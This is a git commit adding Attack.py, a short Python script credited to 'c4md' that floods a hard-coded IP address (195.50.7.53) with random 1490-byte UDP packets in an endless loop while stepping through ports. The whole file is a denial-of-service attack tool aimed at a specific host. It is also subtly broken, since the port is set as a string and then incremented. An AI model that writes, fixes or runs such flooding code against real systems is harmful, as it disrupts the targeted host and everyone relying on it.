dfa7ec18a2f90f38028ffed1db455e1272268b3a
freethemesvk <55578496+freethemesvk@users.noreply.github.com>
2021-10-03 22:57:57 +0300

    Create Attack.py

---
+++ Attack.py
@@ -0,0 +1,22 @@
+import sys
+import os
+import time
+import socket
+import random
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+print "Author   : c4md"
+
+ip = "195.50.7.53"
+port = "80"
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
